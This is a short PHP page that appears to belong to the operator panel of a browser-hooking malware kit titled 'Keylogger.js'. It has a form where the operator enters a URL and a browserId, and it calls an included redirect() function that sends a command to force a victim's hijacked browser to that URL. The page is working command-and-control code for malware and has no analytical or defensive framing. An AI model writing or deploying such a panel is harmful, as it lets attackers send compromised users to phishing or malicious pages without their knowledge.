<?php
    include_once('../../inc/commands.inc.php');

    if(isset($_POST['command']) && $_POST['command'] == '3') {
        if(!redirect($_GET['browserId'], $_POST['url'])) {
            $execCommand = "Command sent successfull";
        }
        else {
            $execCommand = "Error while sending command";
        }
    }
?>

<html>
    <head>
        <meta charset="UTF-8">
        <title>Keylogger.js</title>
    </head>
    <body>
        <div>
            <p>
                This command will redirect the user to the specified URL
            </p>
            <div>
                <?php
                    if(isset($execCommand)) {
                        echo $execCommand;
                    }
                ?>
            </div>
            <div>
                <form action="" method="POST">
                    <div>
                        <label for="name">Enter the redirect URL : </label>
                        <input type="text" name="url"/>
                    </div>
                    <div>
                        <input type="hidden" name="command" value="3"/>
                        <button type="submit" name="execute">Execute</button>
                    </div>                       
                </form>
            </div>
        </div>
    </body>
</html>